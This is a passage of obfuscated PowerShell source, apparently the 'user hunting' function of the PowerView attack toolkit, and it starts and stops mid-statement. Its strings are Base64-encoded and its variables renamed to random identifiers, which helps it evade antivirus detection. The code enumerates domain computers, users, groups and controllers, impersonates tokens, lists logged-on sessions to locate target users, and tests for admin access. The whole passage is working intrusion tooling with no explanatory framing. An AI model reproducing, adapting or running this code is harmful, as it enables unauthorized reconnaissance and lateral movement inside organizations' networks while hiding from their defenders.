($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')
))]) { ${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${79ab263811814b73a0d9eb6e9491daf2} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) 
{ ${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))] = 
$UserAllowDelegation }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${e4eae45442e047e5aa48d7f04d9dc941} = @()
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ${e4eae45442e047e5aa48d7f04d9dc941} = @($ComputerName)
  
      }
        else {
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AGUAYQBsAHQAaAA=')))]) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFMAdABlAGEAbAB0AGgAIABlAG4AdQBtAGUAcgBhAHQAaQBvAG4AIAB1AHMAaQBuAG
cAIABzAG8AdQByAGMAZQA6ACAAJABTAHQAZQBhAGwAdABoAFMAbwB1AHIAYwBlAA==')
))
                ${6b41818ab95e4af8adaae267ad370b3d} = New-Object 
System.Collections.ArrayList
                if ($StealthSource -
match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
        
            Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZgBpAGwAZQAgAHMAZQByAHYAZQByAH
MA')))
                    ${3a3e655938514ad68643b0fdd126433b} = @{}
  
                  if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
          
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) 
{ ${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
             
       if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
                  if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
                    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3a3e655938514ad68643b0fdd126433b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                  
  ${69de9e230abe4de1bcaebd14d41ccfc5} = Get-DomainFileServer 
@3a3e655938514ad68643b0fdd126433b
                    if 
(${69de9e230abe4de1bcaebd14d41ccfc5} -isnot [System.Array]) { 
${69de9e230abe4de1bcaebd14d41ccfc5} = @
(${69de9e230abe4de1bcaebd14d41ccfc5}) }
                    
${6b41818ab95e4af8adaae267ad370b3d}.AddRange( 
${69de9e230abe4de1bcaebd14d41ccfc5} )
                }
               
 if ($StealthSource -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABGAFMAfABBAGwAbAA=')))) {
            
        Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAARABGAFMAIABzAGUAcgB2AGUAcgBzAA
==')))
                }
                if ($StealthSource -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAHwAQQBsAGwA')))) {
                    Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AH
IAbwBsAGwAZQByAHMA')))
                    
${b14bc7e981fe421a972d35fec58e00f2} = @{
                        
'LDAP' = $True
                    }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
                    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                  
  ${97bdc2ae342a4b6b86de63a2cc63f730} = Get-DomainController 
@b14bc7e981fe421a972d35fec58e00f2 | Select-Object -ExpandProperty 
dnshostname
                    if 
(${97bdc2ae342a4b6b86de63a2cc63f730} -isnot [System.Array]) { 
${97bdc2ae342a4b6b86de63a2cc63f730} = @
(${97bdc2ae342a4b6b86de63a2cc63f730}) }
                    
${6b41818ab95e4af8adaae267ad370b3d}.AddRange( 
${97bdc2ae342a4b6b86de63a2cc63f730} )
                }
               
 ${e4eae45442e047e5aa48d7f04d9dc941} = 
${6b41818ab95e4af8adaae267ad370b3d}.ToArray()
            }
           
 else {
                Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAYQBsAGwAIABjAG8AbQBwAHUAdABlAH
IAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
                
${e4eae45442e047e5aa48d7f04d9dc941} = Get-DomainComputer 
@3cb1483537e3424195869ccaa8e07f42 | Select-Object -ExpandProperty 
dnshostname
            }
        }
        Write-Verbose "[Find-
DomainUserLocation] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        if 
(${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAG
EAdABlAA==')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $CurrentUser = 
$Credential.GetNetworkCredential().UserName
        }
        else {
   
         $CurrentUser = ([Environment]::UserName).ToLower()
        
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBoAG8AdwBBAGwAbAA=')))]) {
            $TargetUsers = @()
        
}
        elseif ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
       
     $TargetUsers = Get-DomainUser @79ab263811814b73a0d9eb6e9491daf2 
| Select-Object -ExpandProperty samaccountname
        }
        else 
{
            ${d868f016ade44d61bff142865900b62c} = @{
                
'Identity' = $UserGroupIdentity
                'Recurse' = $True
     
       }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) 
{ ${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
$TargetUsers = Get-DomainGroupMember 
@d868f016ade44d61bff142865900b62c | Select-Object -ExpandProperty 
MemberName
        }
        Write-Verbose "[Find-DomainUserLocation] 
TargetUsers length: $($TargetUsers.Length)"
        if ((-not 
$ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQ
AgAE4AbwAgAHUAcwBlAHIAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAHQAYQByAGcAZQB0AA
==')))
        }
        ${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
       
     Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, 
$TokenHandle)
            if ($TokenHandle) {
                $Null = 
Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            
}
            ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
$ComputerName) {
                ${4efbcb35501b479291674720e11a9ca9} 
= Test-Connection -Count 1 -Quiet -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                if 
(${4efbcb35501b479291674720e11a9ca9}) {
                    
${beec7c20e2cc4dc88b186321277421dd} = Get-NetSession -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                    ForEach 
(${bf54ffd7b29642aaad7029f3922629a7} in 
${beec7c20e2cc4dc88b186321277421dd}) {
                        
${e0e6b6d01ca04c90bf52fb20f9e41317} = 
${bf54ffd7b29642aaad7029f3922629a7}.UserName
                        
${07c1ff1fbb8e48eeb95a9af2eb4d6a43} = 
${bf54ffd7b29642aaad7029f3922629a7}.CName
                        if 
(${07c1ff1fbb8e48eeb95a9af2eb4d6a43} -and 
${07c1ff1fbb8e48eeb95a9af2eb4d6a43}.StartsWith('\\')) {
              
              ${07c1ff1fbb8e48eeb95a9af2eb4d6a43} = 
${07c1ff1fbb8e48eeb95a9af2eb4d6a43}.TrimStart('\')
                   
     }
                        if 
((${e0e6b6d01ca04c90bf52fb20f9e41317}) -and 
(${e0e6b6d01ca04c90bf52fb20f9e41317}.Trim() -ne '') -and 
(${e0e6b6d01ca04c90bf52fb20f9e41317} -notmatch $CurrentUser) -and 
(${e0e6b6d01ca04c90bf52fb20f9e41317} -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAkACQA'))))) {
                            if ( (-not 
$TargetUsers) -or ($TargetUsers -contains 
${e0e6b6d01ca04c90bf52fb20f9e41317})) {
                              
  ${c09c014353b545b1b9f7d5aceee50b24} = New-Object PSObject
          
                      ${c09c014353b545b1b9f7d5aceee50b24} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) 
$Null
                                
${c09c014353b545b1b9f7d5aceee50b24} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) ${e0e6b6d01ca04c90bf52fb20f9e41317}
   
                             ${c09c014353b545b1b9f7d5aceee50b24} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${40850bc66a0f4e928e6df4b311ffe16b}
                                
${c09c014353b545b1b9f7d5aceee50b24} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) 
${07c1ff1fbb8e48eeb95a9af2eb4d6a43}
                                
try {
                                    
${3b3d7c812fef4aba8e69cf18124b6523} = 
[System.Net.Dns]::GetHostEntry(${07c1ff1fbb8e48eeb95a9af2eb4d6a43}) 
| Select-Object -ExpandProperty HostName
                             
       ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) 
${3b3d7c812fef4aba8e69cf18124b6523}
                                
}
                                catch {
                             
       ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                 
               }
                                if ($CheckAccess) {
  
                                  
${3490d150e9374e0a8169a0ef6b90af2d} = (Test-AdminAccess -
ComputerName ${07c1ff1fbb8e48eeb95a9af2eb4d6a43}).IsAdmin
            
                        ${c09c014353b545b1b9f7d5aceee50b24} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) 
${3490d150e9374e0a8169a0ef6b90af2d}.IsAdmin
                          
      }
                                else {
                        
            ${c09c014353b545b1b9f7d5aceee50b24} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) 
$Null
                                }
                               
 ${c09c014353b545b1b9f7d5aceee50b24}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
  
                              ${c09c014353b545b1b9f7d5aceee50b24}
    
                        }
                        }
                   
 }
                    if (-not $Stealth) {
                        
